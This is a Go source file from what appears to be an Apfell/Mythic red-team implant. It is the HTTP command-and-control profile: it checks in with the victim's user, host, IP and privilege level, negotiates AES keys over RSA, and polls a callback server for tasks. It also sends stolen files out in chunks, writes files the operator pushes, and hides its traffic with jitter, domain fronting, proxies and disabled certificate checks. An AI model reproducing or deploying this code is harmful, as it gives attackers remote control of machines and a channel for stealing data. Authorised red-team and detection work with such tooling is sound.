package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"path/filepath"

	//"log"
	"crypto/tls"
	"math"
	"net/http"
	"net/url"
	"os"
	"reflect"
	"strings"
	"sync"
	"time"

	"pkg/utils/crypto"
	"pkg/utils/functions"
	"pkg/utils/structs"
)

var Config = structs.Defaultconfig{
	"encrypted_exchange_check",
	"AESPSK",
	"callback_host:callback_port/",
	"post_uri",
	"get_uri",
	"query_path_name",
	"proxy_host",
	"proxy_port",
	"proxy_user",
	"proxy_pass",
	"USER_AGENT",
	callback_interval,
	"domain_front",
	callback_jitter,
}

var mu sync.Mutex

type C2Default struct {
	HostHeader     string
	BaseURL        string
	PostURI        string
	GetURI         string
	QueryPathName  string
	ProxyURL       string
	ProxyUser      string
	ProxyPass      string
	Interval       int
	Jitter         int
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Default{}
}
func (c C2Default) getSleepTime() int {
	return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
}

func (c C2Default) SleepInterval() int {
	return c.getSleepTime()
}

func (c *C2Default) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c *C2Default) SetSleepJitter(jitter int) {
	c.Jitter = jitter
}

func (c C2Default) ApfID() string {
	return c.ApfellID
}

func (c *C2Default) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Default) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

//CheckIn a new agent
func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operatingsystem string, arch string) interface{} {
	var resp []byte
	// Set the C2 Profile values
	c.BaseURL = Config.BaseURL
	c.Interval = Config.Sleep
	c.Jitter = Config.Jitter
	c.PostURI = Config.PostURI
	c.GetURI = Config.GetURI
	c.QueryPathName = Config.QueryPathName

	// Add proxy info if set
	if len(Config.ProxyHost) > 0 && len(Config.ProxyPort) > 0 {
		c.ProxyURL = fmt.Sprintf("%s:%s/", Config.ProxyHost, Config.ProxyPort)
	} else {
		c.ProxyURL = ""
	}

	if len(Config.ProxyUser) > 0 && len(Config.ProxyPass) > 0 {
		c.ProxyUser = Config.ProxyUser
		c.ProxyPass = Config.ProxyPass
	} else {
		c.ProxyUser = ""
		c.ProxyPass = ""
	}

	if strings.Contains(Config.KEYX, "T") {
		c.ExchangingKeys = true
	} else {
		c.ExchangingKeys = false
	}

	if len(Config.Key) > 0 {
		c.Key = Config.Key
	} else {
		c.Key = ""
	}

	if len(Config.HostHeader) > 0 {
		c.HostHeader = Config.HostHeader
	}

	if len(Config.UserAgent) > 0 {
		c.UserAgent = Config.UserAgent
	} else {
		c.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	}

	c.UUID = UUID
	c.ApfellID = c.UUID
	checkin := structs.CheckInMessage{}
	checkin.Action = "checkin"
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID
	checkin.OS = operatingsystem
	checkin.Architecture = arch
	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}

	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
		_ = c.NegotiateKey()
	}

	raw, _ := json.Marshal(checkin)
	resp = c.htmlPostData(c.PostURI, raw)

	// save the apfell id
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)

	if err != nil {
		//log.Printf("Error in unmarshal:\n %s", err.Error())
	}

	if len(response.ID) != 0 {
		//log.Printf("Saving new UUID: %s\n", response.ID)
		c.ApfellID = response.ID
	}

	return response
}

//NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return ""
	}

	resp := c.htmlPostData(c.PostURI, raw)
	// Decrypt & Unmarshal the response

	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return ""
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID // Save the new UUID
	}

	return sessionID
}

//GetTasking - retrieve new tasks
func (c *C2Default) GetTasking() interface{} {
	url := fmt.Sprintf("%s%s", c.BaseURL, c.GetURI)
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = -1

	raw, err := json.Marshal(request)

	if err != nil {
		//log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.htmlGetData(url, raw)

	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

//PostResponse - Post task responses
func (c *C2Default) PostResponse(output []byte, skipChunking bool) []byte {
	endpoint := c.PostURI
	if !skipChunking {
		return c.postRESTResponse(endpoint, output)
	} else {
		return c.htmlPostData(endpoint, output)
	}

}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer
	//log.Println("Chunks: ", chunks)
	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		responseMsg := structs.TaskResponseMessage{}
		responseMsg.Action = "post_response"
		responseMsg.Responses = make([]json.RawMessage, 1)
		responseMsg.Responses[0] = dataBuffer

		dataToSend, err := json.Marshal(responseMsg)
		if err != nil {
			//log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
			return make([]byte, 0)
		}
		ret := c.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
	//log.Println("Sending POST request to url: ", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	sendData = append([]byte(c.ApfellID), sendData...)             // Prepend the UUID
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendData))
	if err != nil {
		//log.Printf("Error creating new http request: %s", err.Error())
		return make([]byte, 0)
	}
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	req.Header.Set("User-Agent", c.UserAgent)
	// Set the host header if not empty
	if len(c.HostHeader) > 0 {
		req.Host = c.HostHeader
	}
	// loop here until we can get our data to go through properly
	for true {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}

		if len(c.ProxyURL) > 0 {
			proxyURL, _ := url.Parse(c.ProxyURL)
			tr.Proxy = http.ProxyURL(proxyURL)
		}

		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)
		}

		client := &http.Client{
			Timeout:   30 * time.Second,
			Transport: tr,
		}
		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		if resp.StatusCode != 200 {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			//log.Println("Error decoding base64 data: ", err.Error())
			return make([]byte, 0)
		}

		if len(raw) < 36 {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		enc_raw := raw[36:] // Remove the Payload UUID
		// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw = c.decryptMessage(enc_raw)
			//log.Println(enc_raw)
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
				continue
			}
		}
		//log.Printf("Raw htmlpost response: %s\n", string(enc_raw))
		return enc_raw
	}
	return make([]byte, 0) //shouldn't get here
}

//htmlGetData - HTTP GET request for data
func (c *C2Default) htmlGetData(requestUrl string, obody []byte) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// Add proxy url if set
	if len(c.ProxyURL) > 0 {
		proxyURL, _ := url.Parse(c.ProxyURL)
		tr.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: tr,
	}
	var respBody []byte
	var payload []byte
	for true {
		if len(c.Key) > 0 && len(obody) > 0 {
			payload = c.encryptMessage(obody) // Encrypt and then encapsulate the task request
		} else {
			payload = make([]byte, len(obody))
			copy(payload, payload)
		}
		encapbody := append([]byte(c.ApfellID), payload...)     // Prepend the UUID to the body of the request
		encbody := base64.StdEncoding.EncodeToString(encapbody) // Base64 the body

		req, err := http.NewRequest("GET", requestUrl, nil)

		// Add proxy user name and pass if set
		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)
		}

		q := url.Values{}
		q.Add(c.QueryPathName, encbody)

		req.URL.RawQuery = q.Encode()

		if err != nil {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		if len(c.HostHeader) > 0 {
			req.Host = c.HostHeader
		}

		req.Header.Set("User-Agent", c.UserAgent)
		resp, err := client.Do(req)

		if err != nil {
			//time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		if resp.StatusCode != 200 {
			//time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		defer resp.Body.Close()

		respBody, _ = ioutil.ReadAll(resp.Body)
		raw, _ := base64.StdEncoding.DecodeString(string(respBody))
		if len(raw) < 36 {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}
		enc_raw := raw[36:] // Remove the prepended UUID
		if len(c.Key) != 0 {
			enc_raw = c.decryptMessage(enc_raw)
			if len(enc_raw) == 0 {
				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
				continue
			}
		}
		//log.Printf("Raw htmlget response: %s\n", string(enc_raw))
		return enc_raw
	}
	return make([]byte, 0) //shouldn't get here

}

//SendFile - download a file
func (c *C2Default) SendFile(task structs.Task, params string, ch chan []byte) {
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	fi, err := file.Stat()
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	_ = file.Close()

	c.SendFileChunks(task, raw, ch)
}

// Get a file

func (c *C2Default) GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte) {

	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = fileDetails.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = fileDetails.RemotePath
	fileUploadMsg.TaskID = task.TaskID

	msg, _ := json.Marshal(fileUploadMsg)
	mu.Lock()
	UploadResponses = append(UploadResponses, msg)
	mu.Unlock()
	// Wait for response from apfell
	rawData := <-ch

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	f, err := os.Create(fileDetails.RemotePath)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error creating file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}
	defer f.Close()
	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

	_, err = f.Write(decoded)

	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	offset := int64(len(decoded))
	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = fileDetails.FileID
			fileUploadMsg.FullPath = fileDetails.RemotePath
			fileUploadMsg.TaskID = task.TaskID

			msg, _ := json.Marshal(fileUploadMsg)
			mu.Lock()
			UploadResponses = append(UploadResponses, msg)
			mu.Unlock()
			rawData := <-ch
			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error marshaling response: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}
			// Base64 decode the chunk data
			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

			_, err = f.WriteAt(decoded, offset)
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}

			offset = offset + int64(len(decoded))
		}
	}

	resp := structs.Response{}
	resp.UserOutput = "File upload complete"
	resp.Completed = true
	resp.TaskID = task.TaskID
	encResp, err := json.Marshal(resp)
	mu.Lock()
	TaskResponses = append(TaskResponses, encResp)
	mu.Unlock()
	return
}

//SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan []byte) {

	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID

	abspath, _ := filepath.Abs(task.Params)

	chunkResponse.FullPath = abspath

	chunkResponse.IsScreenshot = strings.Compare(task.Command, "screencapture") == 0

	msg, _ := json.Marshal(chunkResponse)
	mu.Lock()
	TaskResponses = append(TaskResponses, msg)
	mu.Unlock()

	var fileDetails map[string]interface{}
	// Wait for a response from the channel

	for {
		resp := <-ch
		err := json.Unmarshal(resp, &fileDetails)
		if err != nil {
			errResponse := structs.Response{}
			errResponse.Completed = true
			errResponse.TaskID = task.TaskID
			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
			errResponseEnc, _ := json.Marshal(errResponse)

			mu.Lock()
			TaskResponses = append(TaskResponses, errResponseEnc)
			mu.Unlock()
			return
		}

		//log.Printf("Receive file download registration response %s\n", resp)
		if _, ok := fileDetails["file_id"]; ok {
			if ok {
				//log.Println("Found response with file_id key ", fileid)
				break
			} else {
				//log.Println("Didn't find response with file_id key")
				continue
			}
		}
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second)

	for i := uint64(0); i < chunks; i++ {
		//log.Println("Index ", i)
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		_, _ = r.Read(partBuffer)

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, _ := json.Marshal(msg)
		mu.Lock()
		TaskResponses = append(TaskResponses, encmsg)
		mu.Unlock()

		// Wait for a response for our file chunk
		var postResp map[string]interface{}
		for {
			decResp := <-ch
			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk

			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}

			//log.Printf("Received chunk download response %s\n", decResp)
			if _, ok := postResp["status"]; ok {
				if ok {
					//log.Println("Found response with status key: ", status)
					break
				} else {
					//log.Println("Didn't find response with status key")
					continue
				}
			}
		}

		if !strings.Contains(postResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time

			mu.Lock()
			TaskResponses = append(TaskResponses, encmsg)
			mu.Unlock()
		}

		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
	}

	r.Reset()
	r = nil
	fileData = nil

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	mu.Lock()
	TaskResponses = append(TaskResponses, finalEnc)
	mu.Unlock()
	return
}

func (c *C2Default) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Default) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
